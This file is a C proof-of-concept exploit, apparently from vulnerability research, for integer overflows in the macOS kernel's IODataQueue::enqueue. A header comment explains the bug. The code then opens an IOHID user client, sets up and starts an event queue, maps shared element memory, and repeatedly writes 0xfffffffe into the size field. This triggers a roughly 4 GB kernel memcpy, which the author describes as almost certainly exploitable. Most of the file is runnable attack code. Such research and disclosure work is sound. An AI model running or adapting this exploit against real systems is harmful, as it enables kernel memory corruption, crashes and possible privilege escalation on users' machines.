/*
clang -o hidlib_enqueue_overflow hidlib_enqueue_overflow.c -framework IOKit

The class IODataQueue is used in various places in the kernel. There are a couple of exploitable
integer overflow issues in the ::enqueue method:

Boolean IODataQueue::enqueue(void * data, UInt32 dataSize)
{
  const UInt32       head      = dataQueue->head;  // volatile
  const UInt32       tail      = dataQueue->tail;
  const UInt32       entrySize = dataSize + DATA_QUEUE_ENTRY_HEADER_SIZE;  <-- (a)
  IODataQueueEntry * entry;

  if ( tail >= head )
  {
    // Is there enough room at the end for the entry?
    if ( (tail + entrySize) <= dataQueue->queueSize )                      <-- (b)
    {
      entry = (IODataQueueEntry *)((UInt8 *)dataQueue->queue + tail);

      entry->size = dataSize;
      memcpy(&entry->data, data, dataSize);                                <-- (c)


The additions at (a) and (b) should be checked for overflow. In both cases, by supplying a large value for
dataSize an attacker can reach the memcpy call at (c) with a length argument which is larger than the remaining
space in the queue buffer.

The majority of this PoC involves setting up the conditions to actually be able to reach a call to ::enqueue with a controlled
dataSize argument, the bug itself it quite simple.

This PoC creates an IOHIDLibUserClient (IOHIDPointingDevice) and calls the create_queue externalMethod to create an IOHIDEventQueue
(which inherits from IODataQueue.) This is the queue which will have the ::enqueue method invoked with the large dataSize argument.

The PoC then calls IOConnectMapMemory with a memoryType argument of 0 which maps an array of IOHIDElementValues into userspace:

typedef struct _IOHIDElementValue
{
  IOHIDElementCookie  cookie;
  UInt32        totalSize;
  AbsoluteTime    timestamp;
  UInt32        generation;
  UInt32        value[1];
}IOHIDElementValue;

The first dword of the mapped memory is a cookie value and the second is a size.

When the IOHIDElementPrivate::processReport method is invoked (in response to an HID event) if there are any listening queues then the
IOHIDElementValue will be enqueued - and the size is in shared memory :-)

The PoC calls the startQueue selector to start the listening queue then calls addElementToQueue passing the cookie for the first
IOHIDElementValue and the ID of the listening queue.

A loop then overwrites the totalSize field of the IOHIDElementValue in shared memory with 0xfffffffe. When the processReport method
is called this will call IODataQueue::enqueue and overflow the calculation of entry size such that it will attempt to memcpy
0xfffffffe bytes. Note that the size of the queue buffer is also attacked controlled, and the kernel is 64-bit, so a 4gb memcpy is
almost certainly exploitable.

Note that lldb seems to get confused by the crash - the memcpy implementation uses rep movsq and lldb doesn't seem to understand the
0xf3 (rep) prefix - IDA disassembles the function fine though. Also the symbols for memcpy and real_mode_bootstrap_end seem to have the
same address so the lldb backtrace looks weird, but it is actually memcpy.

tested on: MacBookAir5,2 w/ 10.9.3/13d65
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOHIDPointingDevice");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 0);
  }
  
  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

    
  // create a queue

  inputScalar[0] = 0x0;     // flags
  inputScalar[1] = 0x10000; // depth
  inputScalarCnt = 2;
  outputScalarCnt = 1;

  err = IOConnectCallMethod(
    conn,
    0x3, // create_queue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }

  // get the id of that queue

  uint32_t qid = outputScalar[0];
  printf("created queue id: 0x%x\n", qid);



  // map the elementValues
  // (calls getMemoryWithCurrentElementValues and maps an array of IOHIDElementValues into userspace)
    
  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;
  uint32_t* buf = 0;

  err = IOConnectMapMemory(conn, 0, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);

  for (int i = 0; i < size/4; i++){
    printf("0x%08x\n", buf[i]);
  }

  // get the cookie for the first element
  uint32_t cookie = buf[0];


  // start the queue
  
  inputScalarCnt = 1;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;


  inputScalar[0] = qid;

  err = IOConnectCallMethod(
    conn,
    0x8, // startQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }
  
  printf("started queue\n");


  // add the element to the queue
  
  inputScalarCnt = 3;
  inputStructCnt = 0;
  outputScalarCnt = 1;
  outputStructCnt = 0;


  inputScalar[0] = qid;    // queue id
  inputScalar[1] = cookie; // cookie for the first element
  inputScalar[2] = 0;


  err = IOConnectCallMethod(
    conn,
    0x5, // addElementToQueue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }
  
  printf("0x%x\n", outputScalar[0]);

  // overwrite the totalSize field of the IOHIDElementValue which is mapped into userspace
  // to trigger the integer overflow when it gets enqueued 
  for(;;){
    buf[1] = 0xfffffffe;
  }

  return 0;
}
